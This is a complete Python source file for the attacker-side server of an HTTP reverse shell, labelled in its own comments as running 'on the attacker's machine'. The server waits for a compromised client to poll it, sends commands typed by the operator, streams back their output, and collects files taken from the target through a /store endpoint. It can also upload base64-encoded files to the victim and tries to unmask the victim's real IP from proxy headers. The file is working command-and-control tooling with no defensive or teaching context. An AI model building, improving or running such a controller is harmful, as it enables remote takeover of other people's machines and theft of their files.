#Server ----> runs on the attacker's machine

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import os
import sys
import base64
from datetime import datetime
import argparse
import signal
import sys

# Handle cgi deprecation in Python 3.13+
if sys.version_info >= (3, 13):
    try:
        import legacy_cgi as cgi
    except ImportError:
        print("Error: 'cgi' module is deprecated in Python 3.13+")
        print("Please install legacy-cgi: pip install legacy-cgi")
        sys.exit(1)
else:
    import warnings
    warnings.filterwarnings("ignore", "'cgi' is deprecated", DeprecationWarning)
    import cgi

# ANSI Color codes
class Colors:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'

HTTP_STATUS_OK = 200

# Parse command-line arguments
parser = argparse.ArgumentParser(description='Reverse shell server')
parser.add_argument('--host', '-H', default='0.0.0.0',
                    help='Server IP to bind to (default: 0.0.0.0)')
parser.add_argument('--port', '-p', type=int, default=8080,
                    help='Server port (default: 8080)')
parser.add_argument('--shell-prefix', '-s', default='Shell',
                    help='Custom shell prompt prefix (default: Shell)')
args = parser.parse_args()

# IP and port the HTTP server listens on (will be queried by client.py)
ATTACKER_IP = args.host
ATTACKER_PORT = args.port
SHELL_PREFIX = args.shell_prefix

# Global interrupt flag
interrupt_flag = False

def interrupt_handler(sig, frame):
    global interrupt_flag
    # If no client is connected, allow normal Ctrl-C to exit
    if not MyHandler.connection_established:
        print(f"\n{Colors.YELLOW}[!] Shutting down server...{Colors.RESET}")
        sys.exit(0)
    # Otherwise, set interrupt flag for command interruption
    if not interrupt_flag:  # Only print once
        interrupt_flag = True
        print(f"\n{Colors.YELLOW}[!] Interrupt signal received - stopping command...{Colors.RESET}")

class MyHandler(BaseHTTPRequestHandler):

    # Track the filename from download command
    last_download_filename = None
    # Track connection status
    connection_established = False

    # Don't print: 127.0.0.1 - - [22/Jun/2021 21:29:43] "POST / HTTP/1.1" 200
    def log_message(self, format, *args):
        pass

    def handle(self):
        """Override handle to catch connection errors gracefully"""
        try:
            super().handle()
        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
            if MyHandler.connection_established:
                print(f"\n{Colors.RED}[-] Client disconnected{Colors.RESET}")
                MyHandler.connection_established = False
                print(f"{Colors.CYAN}[*] Listening for connections...{Colors.RESET}")
        except Exception as e:
            print(f"\n{Colors.RED}[-] Connection error: {e}{Colors.RESET}")
            MyHandler.connection_established = False
            print(f"{Colors.CYAN}[*] Listening for connections...{Colors.RESET}")

    def save_file(self, length):
        data = parse_qs(self.rfile.read(length).decode())
        
        # Determine filename from last download command or use default
        if MyHandler.last_download_filename:
            filename = os.path.basename(MyHandler.last_download_filename)
            MyHandler.last_download_filename = None  # Reset after use
        else:
            filename = 'downloaded_file'
        
        # Check if file exists
        if os.path.exists(filename):
            response = input(f"{Colors.YELLOW}[?] File '{filename}' already exists. Overwrite? (Y/N): {Colors.RESET}").strip().upper()
            if response != 'Y':
                # Generate unique filename with timestamp
                timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
                name, ext = os.path.splitext(filename)
                filename = f"{name}_{timestamp}{ext}"
                print(f"{Colors.CYAN}[*] Saving as '{filename}' instead{Colors.RESET}")
        
        # Save the file
        try:
            with open(filename, 'wb') as output_file:
                output_file.write(data["rfile"][0].encode())
            print(f"{Colors.GREEN}[+] File saved as '{os.path.abspath(filename)}'{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[-] Error saving file: {e}{Colors.RESET}")

    # Send command to client (on Target)
    def do_GET(self):
        global interrupt_flag
        
        # Print connection established message on first GET request
        if not MyHandler.connection_established:
            client_ip = self.client_address[0]
            client_port = self.client_address[1]
            
            # Debug: Print all headers to find real client IP behind proxy
            print(f"\n{Colors.CYAN}[DEBUG] All HTTP Headers:{Colors.RESET}")
            for header, value in self.headers.items():
                print(f"{Colors.CYAN}  {header}: {value}{Colors.RESET}")
            print(f"{Colors.CYAN}[DEBUG] Direct client_address: {client_ip}:{client_port}{Colors.RESET}")
            
            # Check common proxy headers for real client IP
            real_ip = (self.headers.get('X-Forwarded-For') or 
                      self.headers.get('X-Real-IP') or 
                      self.headers.get('CF-Connecting-IP') or
                      client_ip)
            print(f"{Colors.CYAN}[DEBUG] Detected real IP: {real_ip}{Colors.RESET}\n")
            
            print(f"\n{Colors.GREEN}{Colors.BOLD}[+] Connection established from {real_ip}(:{client_port}) - The port is the last hop port{Colors.RESET}")
            MyHandler.connection_established = True
        
        # Clear interrupt flag and restore default handler for input
        interrupt_flag = False
        signal.signal(signal.SIGINT, signal.default_int_handler)
        
        try:
            command = input(f"{Colors.BOLD}{Colors.MAGENTA}{SHELL_PREFIX}>{Colors.RESET} ")
        except KeyboardInterrupt:
            # User pressed Ctrl-C at prompt - handle gracefully
            print(f"\n{Colors.CYAN}[*] Use 'terminate' to stop client or press Ctrl-C again to shutdown server{Colors.RESET}")
            try:
                # Give them another chance - if they press Ctrl-C again, shut down
                signal.signal(signal.SIGINT, signal.default_int_handler)
                command = input(f"{Colors.BOLD}{Colors.MAGENTA}{SHELL_PREFIX}>{Colors.RESET} ")
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[!] Shutting down server...{Colors.RESET}")
                sys.exit(0)
        
        # Re-enable custom interrupt handler for command execution
        signal.signal(signal.SIGINT, interrupt_handler)
        
        # Handle terminate command with confirmation
        if command.strip() == 'terminate':
            confirm = input(f"{Colors.YELLOW}[?] Are you sure you want to terminate the client? (Y/N): {Colors.RESET}").strip().upper()
            if confirm != 'Y':
                print(f"{Colors.CYAN}[*] Terminate command cancelled{Colors.RESET}")
                command = "echo Terminate cancelled"
            else:
                print(f"{Colors.GREEN}[+] Sending terminate command to client{Colors.RESET}")
                # Mark that we're terminating the client
                MyHandler.connection_established = False
                # Reset signal handler to allow clean Ctrl-C
                signal.signal(signal.SIGINT, signal.default_int_handler)
        
        # Handle download command - capture filename
        if command.strip().startswith('download '):
            parts = command.strip().split(maxsplit=1)
            if len(parts) == 2:
                MyHandler.last_download_filename = parts[1]
        
        # Handle upload command specially
        elif command.strip().startswith('upload '):
            parts = command.strip().split(maxsplit=1)
            if len(parts) == 2:
                filepath = parts[1]
                if os.path.exists(filepath):
                    try:
                        with open(filepath, 'rb') as f:
                            file_data = f.read()
                        b64_data = base64.b64encode(file_data).decode('utf-8')
                        filename = os.path.basename(filepath)
                        command = f"upload {filename}:{b64_data}"
                        print(f"{Colors.CYAN}[*] Uploading {filepath} ({len(file_data)} bytes){Colors.RESET}")
                    except Exception as e:
                        print(f"{Colors.RED}[-] Error reading file: {e}{Colors.RESET}")
                        command = f"echo Error: Could not read file {filepath}"
                else:
                    print(f"{Colors.RED}[-] File not found: {filepath}{Colors.RESET}")
                    command = f"echo Error: File not found {filepath}"
            else:
                print(f"{Colors.RED}[-] Usage: upload <filepath>{Colors.RESET}")
                command = "echo Error: Invalid upload command"
        
        try:
            self.send_response(HTTP_STATUS_OK)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(command.encode())
        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError) as e:
            print(f"\n{Colors.RED}[-] Client disconnected during command send{Colors.RESET}")
            MyHandler.connection_established = False
            print(f"{Colors.CYAN}[*] Listening for connections...{Colors.RESET}")

    def do_POST(self):
        global interrupt_flag
        
        # Mark connection as active
        if not MyHandler.connection_established:
            MyHandler.connection_established = True
        
        try:
            length = int(self.headers['Content-Length'])
            
            # If interrupt was requested, send 204 and skip processing
            if interrupt_flag:
                self.send_response(204)  # No Content - signals interrupt to client
                self.end_headers()
                return
            
            self.send_response(200)
            self.end_headers()

            if self.path == '/store':
                try:
                    self.save_file(length)
                except Exception as e:
                    print(e)
                finally:
                    return

            data = parse_qs(self.rfile.read(length).decode())
            
            # Handle different request types
            if "type" in data and data["type"][0] == "command_output":
                # This is streaming command output
                if "data" in data:
                    print(data["data"][0], end='')
            elif "rfile" in data:
                # This is legacy/file data
                print(data["rfile"][0])
        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError) as e:
            print(f"\n{Colors.RED}[-] Client disconnected during data transfer{Colors.RESET}")
            MyHandler.connection_established = False
            print(f"{Colors.CYAN}[*] Listening for connections...{Colors.RESET}")
        except Exception as e:
            print(f"\n{Colors.RED}[-] Error in POST handler: {e}{Colors.RESET}")


if __name__ == '__main__':
    myServer = HTTPServer((ATTACKER_IP, ATTACKER_PORT), MyHandler)

    print(f'{Colors.GREEN}{Colors.BOLD}[*] Server started on {ATTACKER_IP}:{ATTACKER_PORT}{Colors.RESET}')
    print(f'{Colors.CYAN}[*] Listening for connections...{Colors.RESET}')
    print(f'{Colors.YELLOW}[*] Press Ctrl-C during command execution to interrupt it{Colors.RESET}')
    print(f'{Colors.YELLOW}[*] Press Ctrl-C twice at prompt to shut down server{Colors.RESET}')
    print(f'{Colors.YELLOW}[*] Use "terminate" command to stop the client{Colors.RESET}')
    
    # Start with custom signal handler
    signal.signal(signal.SIGINT, interrupt_handler)
    
    try:
        myServer.serve_forever()
    except SystemExit:
        myServer.server_close()
    except Exception as e:
        print(f'\n{Colors.RED}[-] Server error: {e}{Colors.RESET}')
        myServer.server_close()
